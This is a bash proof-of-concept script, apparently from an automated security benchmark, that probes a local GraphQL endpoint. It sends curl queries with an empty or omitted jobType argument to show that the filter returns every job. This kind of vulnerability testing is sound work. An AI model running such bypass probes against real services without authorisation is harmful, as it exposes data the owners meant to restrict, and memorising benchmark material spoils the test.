#!/bin/bash
# POC: Demonstrates GraphQL query filter bypass by passing empty string or omitting jobType argument, returning all jobs instead of filtered results
# Target: ./repo
# Created: 2025-11-10T15:09:47.305Z
# Session: benchmark-XBEN-038-24-mht9rpjz

# GraphQL Query Filter Bypass POC - Empty String Argument
# This POC demonstrates that empty string or missing jobType argument bypasses filtering

TARGET="http://localhost:8000/graphql/"

echo "=== GraphQL Query Filter Bypass POC ==="
echo ""

# Test 1: Valid filter with "front-end"
echo "[*] Test 1: Valid filter - jobType: \"front-end\""
RESPONSE1=$(curl -s -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ jobs(jobType: \"front-end\") { id name type } }"}')

JOB_COUNT1=$(echo "$RESPONSE1" | grep -o '"id"' | wc -l)
echo "Response: $RESPONSE1"
echo "Jobs returned: $JOB_COUNT1"
echo ""

# Test 2: Valid filter with "back-end"
echo "[*] Test 2: Valid filter - jobType: \"back-end\""
RESPONSE2=$(curl -s -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ jobs(jobType: \"back-end\") { id name type } }"}')

JOB_COUNT2=$(echo "$RESPONSE2" | grep -o '"id"' | wc -l)
echo "Response: $RESPONSE2"
echo "Jobs returned: $JOB_COUNT2"
echo ""

# Test 3: Filter bypass - Empty string
echo "[*] Test 3: FILTER BYPASS - jobType: \"\" (empty string)"
RESPONSE3=$(curl -s -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ jobs(jobType: \"\") { id name type } }"}')

JOB_COUNT3=$(echo "$RESPONSE3" | grep -o '"id"' | wc -l)
echo "Response: $RESPONSE3"
echo "Jobs returned: $JOB_COUNT3"
echo ""

# Test 4: Filter bypass - Omitted argument
echo "[*] Test 4: FILTER BYPASS - jobType argument omitted"
RESPONSE4=$(curl -s -X POST "$TARGET" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ jobs { id name type } }"}')

JOB_COUNT4=$(echo "$RESPONSE4" | grep -o '"id"' | wc -l)
echo "Response: $RESPONSE4"
echo "Jobs returned: $JOB_COUNT4"
echo ""

# Analysis
echo "=== VULNERABILITY ANALYSIS ==="
echo "Test 1 (front-end filter): $JOB_COUNT1 jobs returned"
echo "Test 2 (back-end filter): $JOB_COUNT2 jobs returned"
echo "Test 3 (empty string): $JOB_COUNT3 jobs returned (SHOULD BE 0, GOT ALL!)"
echo "Test 4 (omitted argument): $JOB_COUNT4 jobs returned (SHOULD REQUIRE ARGUMENT, GOT ALL!)"
echo ""

if [ "$JOB_COUNT3" -gt "$JOB_COUNT1" ] && [ "$JOB_COUNT3" -gt "$JOB_COUNT2" ]; then
  echo "[!] VULNERABILITY CONFIRMED: Empty string argument bypasses filter!"
  echo "[!] VULNERABILITY CONFIRMED: Omitted argument bypasses filter!"
  exit 0
else
  echo "[-] Could not confirm vulnerability"
  exit 1
fi